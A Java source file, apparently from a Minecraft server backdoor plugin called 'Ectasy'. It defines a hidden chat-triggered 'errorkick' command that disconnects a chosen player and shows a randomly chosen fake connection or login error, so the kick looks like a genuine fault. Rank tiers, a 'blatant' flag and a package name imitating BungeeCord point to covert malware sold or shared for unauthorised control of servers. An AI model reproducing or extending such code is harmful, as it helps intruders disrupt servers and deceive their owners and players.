package fr.body.ectasy.command.impl;

import fr.body.ectasy.command.AbstractCommand;
import fr.body.ectasy.command.CommandInfo;
import fr.body.ectasy.user.Rank;
import fr.body.ectasy.util.ChatUtil;
import net.md5.bungee.Ectasy;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.scheduler.BukkitRunnable;

import java.util.concurrent.ThreadLocalRandom;

@CommandInfo(
   name = "errorkick",
   description = "Kicks someone with fake error",
   blatant = true,
   rank = Rank.LITE
)
public class ErrorKickCommand extends AbstractCommand {
   public ErrorKickCommand() {
   }

   @Override
   public void execute(AsyncPlayerChatEvent event, String var2, String[] var3) {
      if (var3.length == 0) {
         ChatUtil.sendChat(event.getPlayer(), "Please, use errorkick <player>");
      } else {
         Player p = Bukkit.getPlayer(var3[0]);
         if (p == null) {
            ChatUtil.sendChat(event.getPlayer(), "Player " + var3[0] + " is not online.");
         } else {
            String[] errors = new String[]{
               "java.net.ConnectException: connection refused: no further information",
               "End of stream",
               "Failed to login: Bad login",
               "Internal Exception: io.netty.handler.timeout.ReadTimeoutException",
               "java.io.IOException: Server returned HTTP response code: 503",
               "Internal exception: java.net.SocketException: Connection reset",
               "Could not connect: Outdated client!",
               "You are not whitelisted on this server!",
               "Timed out",
               "Internal Exception: java.lang.NullPointerException"
            };
            new BukkitRunnable() {
               @Override
               public void run() {
                  String var1 = errors[ThreadLocalRandom.current().nextInt(errors.length)];
                  p.kickPlayer(var1);
                  ChatUtil.sendChat(event.getPlayer(), "Kicked for " + var1);
               }
            }.runTask(Ectasy.parentPlugin);
         }
      }
   }
}
